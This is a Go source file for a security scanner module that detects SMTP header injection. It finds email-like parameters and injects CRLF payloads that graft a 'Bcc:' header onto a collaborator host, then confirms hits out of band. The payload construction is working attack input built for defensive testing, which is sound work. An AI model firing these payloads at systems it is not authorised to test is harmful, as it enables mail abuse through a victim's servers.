package smtp_header_injection

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/modules/shared/authzutil"
	"github.com/vigolium/vigolium/pkg/oast/oastclass"
	"github.com/vigolium/vigolium/pkg/output"
)

// emailNameParts are param-name substrings that indicate an email recipient field.
var emailNameParts = []string{"email", "e-mail", "mail", "recipient", "rcpt", "sender", "replyto", "reply-to", "reply_to", "contact"}

// emailNameExact are short param names that indicate a mail header field but would
// substring-match unrelated params ("token" contains "to"), so they are matched
// exactly instead.
var emailNameExact = map[string]bool{"to": true, "from": true, "cc": true, "bcc": true, "reply": true}

// Module implements the SMTP header injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new SMTP header injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rhm: dedup.LazyDefaultRHM("smtp_header_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint plants CRLF Bcc-graft payloads into email-bearing
// parameters. Confirmation is out-of-band (the mailer resolves the grafted Bcc
// domain), so findings arrive asynchronously via the OAST polling callback and this
// method returns no synchronous results.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return nil, nil // no confirmation channel; nothing to do
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}
	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return nil, nil
	}
	if !isEmailParam(ip.Name(), ip.BaseValue()) {
		return nil, nil
	}

	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), ip.Name(), ip.BaseValue(), fmt.Sprintf("%d", ip.Type())) {
			return nil, nil
		}
	}

	base := baseEmail(ip.BaseValue())
	requestHash := ctx.Request().ID()

	// One collaborator host per payload so a callback pinpoints which vector fired:
	// a plain-recipient callback is email-sending capability, while a Bcc-graft
	// callback confirms the injected header was honoured (header injection).
	for _, mk := range payloadMakers(base) {
		host := modkit.OASTURLFor(oast, oastclass.SMTP, urlx.String(), ip.Name(), mk.injectionType, ModuleID, requestHash)
		if host == "" {
			return nil, nil
		}
		payload := mk.prefix + host
		oast.RecordPayload(host, payload)
		req := httpmsg.NewRequestResponseRaw(httpmsg.BuildPayload(ip, []byte(payload), mk.preEncoded), ctx.Service())
		resp, _, execErr := httpClient.Execute(req, http.Options{})
		if execErr != nil {
			if errors.Is(execErr, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}
		resp.Close()
	}

	return nil, nil
}

// payloadMaker is one out-of-band vector: the planted value is prefix + the minted
// collaborator host.
type payloadMaker struct {
	injectionType string
	prefix        string
	// preEncoded: the prefix carries its own %-encoding and is built through
	// httpmsg.BuildPreEncoded so "%0d%0a" is not double-encoded (MISS-12).
	preEncoded bool
}

// payloadMakers returns the recipient and Bcc-graft payloads for base. The graft is
// shipped with both encoded (%0d%0a) and raw CRLF because whether the separator
// survives to the mail header depends on the insertion-point context (URL vs body).
func payloadMakers(base string) []payloadMaker {
	return []payloadMaker{
		{injectionType: "smtp email-sending capability", prefix: "vigolium-poc@"},
		{injectionType: "smtp-header-injection bcc graft", prefix: base + "%0d%0aBcc:%20vigolium-poc@", preEncoded: true},
		{injectionType: "smtp-header-injection bcc graft", prefix: base + "\r\nBcc: vigolium-poc@"},
	}
}

// baseEmail returns the parameter's existing email value, or a neutral placeholder
// address when the value is not itself an email.
func baseEmail(value string) string {
	if authzutil.EmailPattern.MatchString(strings.TrimSpace(value)) {
		return strings.TrimSpace(value)
	}
	return "vigolium-base@example.com"
}

// isEmailParam reports whether an insertion point looks like an email recipient
// field, by name or by a value that is itself an email address.
func isEmailParam(name, value string) bool {
	lname := strings.ToLower(name)
	if emailNameExact[lname] {
		return true
	}
	for _, s := range emailNameParts {
		if strings.Contains(lname, s) {
			return true
		}
	}
	return authzutil.EmailPattern.MatchString(strings.TrimSpace(value))
}
